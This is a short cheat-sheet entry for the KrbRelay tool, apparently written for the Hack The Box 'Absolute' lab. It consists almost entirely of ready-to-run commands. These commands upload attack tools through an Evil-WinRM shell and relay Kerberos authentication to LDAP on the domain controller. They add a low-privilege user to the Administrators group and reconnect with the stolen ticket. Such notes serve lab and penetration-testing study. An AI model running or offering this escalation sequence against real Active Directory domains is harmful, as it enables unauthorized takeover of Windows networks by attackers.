# Name
KrbRelay

## Usage
```
# In Evil-WinRM shell:
upload ../CheckPort.exe
upload ../KrbRelay.exe
upload RunasCs.exe runascs.exe

# Find available ports for the OXID resolver to run:
.\CheckPort.exe

# Execute krbrelay from runascs to have interactive session:
.\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\Users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10"

# Add User to Administrators group:
.\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\Users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"

# Check that user it in administrators group:
net user winrm_user

# Exit and login evil-winrm again
exit
KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
```

## Source
https://github.com/cube0x0/KrbRelay
